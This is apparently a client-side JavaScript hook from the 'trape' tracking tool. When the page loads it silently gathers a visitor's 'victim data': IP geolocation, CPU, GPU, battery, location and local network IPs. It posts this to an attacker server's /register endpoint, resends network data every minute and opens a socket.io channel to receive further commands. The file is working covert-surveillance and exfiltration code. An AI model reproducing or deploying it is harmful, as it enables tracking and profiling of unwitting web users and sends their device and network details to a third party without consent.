$(document).ready(function($) {

    $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=' + window.IpInfoApiKey, function(data) {
        var d = getVictimData();

        $.extend(true, d, data);

        var parser = new UAParser();

        d.cpu = JSON.stringify(parser.getCPU())
            .replace(/"/gi, '')
            .replace(/{/gi, '')
            .replace(/}/gi, '')
            .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');

        d.refer = document.location.host;

        $.ajax({
            url: window.serverPath + "/register",
            data: d,
            dataType: "json",
            type: "POST",
            success: function(response) {
                if (response.status == 'OK'){
                    localStorage.setItem("trape_vId", response.vId);
                    conChange();
                    queryGPU();
                    locateV();
                    tping();
                    detectBattery();
                    navigation_mode();

                    objUser.getIPs();
                    objUser.sendNetworks();

                    setInterval(function(){ 
                        objUser.getIPs();
                        objUser.sendNetworks();
                    }, 60000);

                    createSockets();
                }
            },
            error: function(error) {}
        });
    });
});

function createSockets(){
    if (typeof(io) != 'undefined') {
        namespace = '/trape';
        if (window.serverPath == ''){
            socketTrape = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
        } else{
            socketTrape = io.connect(window.serverPath + namespace);
        }
    }

    if (socketTrape != null){
        window.onbeforeunload = function(e) {
            var d = getVictimData();
            socketTrape.emit('disconnect_request', d);
            return true;
        }
    }

    if (socketTrape != undefined) {
        socketTrape.emit('join', {room: localStorage.trape_vId});
        defineSockets(socketTrape);
    }
}